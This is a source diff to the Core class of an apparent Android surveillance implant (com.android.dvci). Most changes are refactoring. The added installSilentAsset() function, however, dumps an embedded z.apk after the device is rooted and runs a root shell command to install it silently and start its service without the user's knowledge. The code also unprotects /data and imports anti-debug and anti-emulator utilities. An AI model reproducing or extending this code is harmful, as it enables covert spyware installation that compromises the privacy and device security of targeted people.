@@ -18,7 +18,6 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
-import android.util.Log;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
@@ -39,6 +38,9 @@ import com.android.dvci.optimize.NetworkOptimizer;
 import com.android.dvci.util.AntiDebug;
 import com.android.dvci.util.AntiEmulator;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.PackageUtils;
+import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
@@ -68,11 +70,6 @@ public class Core extends Activity implements Runnable {
 	private Thread coreThread = null;
 
 	/**
-	 * The content resolver.
-	 */
-	private ContentResolver contentResolver;
-
-	/**
 	 * The agent manager.
 	 */
 	private ManagerModule moduleManager;
@@ -82,9 +79,6 @@ public class Core extends Activity implements Runnable {
 	 */
 	private ManagerEvent eventManager;
 	private WakeLock wl;
-	// private long queueSemaphore;
-	private Thread fastQueueThread;
-	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
 
@@ -149,9 +143,9 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
 			}
-			if(!Status.isBlackberry() && Cfg.GUI) {
+			if (!Status.isBlackberry() && Cfg.GUI) {
 				Status.setIconState(true);
-				if(!Cfg.DEMO) {
+				if (!Cfg.DEMO) {
 					closeMainActivity();
 				}
 			}
@@ -214,7 +208,10 @@ public class Core extends Activity implements Runnable {
 		moduleManager = ManagerModule.self();
 		eventManager = ManagerEvent.self();
 
-		contentResolver = cr;
+		/*
+	  The content resolver.
+	 */
+		ContentResolver contentResolver = cr;
 
 		if (Cfg.DEBUG) {
 			coreThread.setName(getClass().getSimpleName());
@@ -280,10 +277,11 @@ public class Core extends Activity implements Runnable {
 					//Status.getAppGui().showInstallDialog();
 					try {
 						ASG gui = Status.getAppGui();
-						if(gui!=null && !gui.isFinishing()) {
+						if (gui != null && !gui.isFinishing()) {
 							gui.finish();
 						}
-					}catch(Exception ex){};
+					} catch (Exception ex) {
+					}
 
 				}
 			});
@@ -348,7 +346,7 @@ public class Core extends Activity implements Runnable {
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
@@ -415,7 +413,7 @@ public class Core extends Activity implements Runnable {
 			}
 			// this markup is created by UninstallAction
 			//final Markup markup = new Markup(UNINSTALL_MARKUP);
-			if (haveUninstallMarkup()) {
+			if (haveMarkup(UNINSTALL_MARKUP)) {
 				UninstallAction.actualExecute(true);
 				confLoaded = ConfType.Error;
 			} else {
@@ -473,14 +471,15 @@ public class Core extends Activity implements Runnable {
 	}
 
 	private synchronized boolean checkActions() {
-		checkActionFast = new CheckAction(Action.FAST_QUEUE);
+		CheckAction checkActionFast = new CheckAction(Action.FAST_QUEUE);
 
-		fastQueueThread = new Thread(checkActionFast);
+		Thread fastQueueThread = new Thread(checkActionFast);
 		fastQueueThread.start();
 
 		return checkActions(Action.MAIN_QUEUE);
 
 	}
+
 
 	class CheckAction implements Runnable {
 		private final int queue;
@@ -679,8 +678,8 @@ public class Core extends Activity implements Runnable {
 
 			/*
 			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
-			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
-			 * 
+			 * Check.Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
+			 *
 			 * return ConfType.Error; }
 			 */
 
@@ -694,13 +693,13 @@ public class Core extends Activity implements Runnable {
 
 			return ret;
 
-		} catch (final GeneralException rcse) {
+		} catch (final GeneralException e) {
 			if (Cfg.EXCEPTION) {
-				Check.log(rcse);
+				Check.log(e);
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(rcse);//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
 			}
 		} catch (final Exception e) {
@@ -929,7 +928,6 @@ public class Core extends Activity implements Runnable {
 						Check.log(TAG + " Warn: " + "executeAction() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
 					}
 
-					continue;
 				} else {
 					if (subAction.considerStop()) {
 						if (Cfg.DEBUG) {
@@ -1051,21 +1049,27 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-
-	public boolean haveUninstallMarkup() {
-		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
+	public boolean haveMarkup(String markup) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (haveUninstallMarkup) " + markup.exists());
+			Check.requires(!StringUtils.isEmpty(markup), "empty markup");
 		}
-		return markup.exists();
+		final AutoFile fmarkup = new AutoFile(Status.getAppContext().getFilesDir(), markup);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (haveUninstallMarkup) " + fmarkup.exists());
+		}
+		return fmarkup.exists();
 	}
 
-	public synchronized void createUninstallMarkup() {
+	public synchronized void createMarkup(String markup) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createUninstallMarkup) ");
 		}
-		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
-		markup.write(1);
+		final AutoFile fmarkup = new AutoFile(Status.getAppContext().getFilesDir(), markup);
+		fmarkup.write(1);
+	}
+
+	public void createUninstallMarkup() {
+		createMarkup(UNINSTALL_MARKUP);
 	}
 
 	/*
@@ -1073,7 +1077,46 @@ public class Core extends Activity implements Runnable {
 	 * should be included here
 	 */
 	public void firstRoot() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (firstRoot) ");
+		}
 		Path.unprotect(M.e("/data"), 0, true);
 		Status.setPlayStoreEnableStatus(true);
+
+		if (Status.self().isMelted()) {
+
+			installSilentAsset();
+
+		}
+	}
+
+	private void installSilentAsset() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installSilentAsset)");
+		}
+		String dvci = M.e("com.android.dvci");
+		if (!PackageUtils.isInstalledApk(dvci)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installSilentAsset), going to install");
+			}
+			Utils.dumpAssetPayload(M.e("z.apk"));
+			// Create the rooting script
+			String pack = Status.getAppContext().getPackageName();
+			//pm install -r -f /data/local/tmp/adb-tmp.apk
+			Execute.executeRootAndForgetScript(String.format(M.e("pm install -r -f /data/data/%s/files/z.apk; sleep 2; am startservice com.android.dvci/.ServiceMain; sleep 2"), pack));
+			// if not installed com.android.dvci:
+			//   install com.android.dvci
+			// if not running:
+			//   start it
+			// if running:
+			//   exit
+			//
+			if (PackageUtils.isInstalledApk(dvci)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installSilentAsset), stopping melt");
+				}
+				Stop();
+			}
+		}
 	}
 }
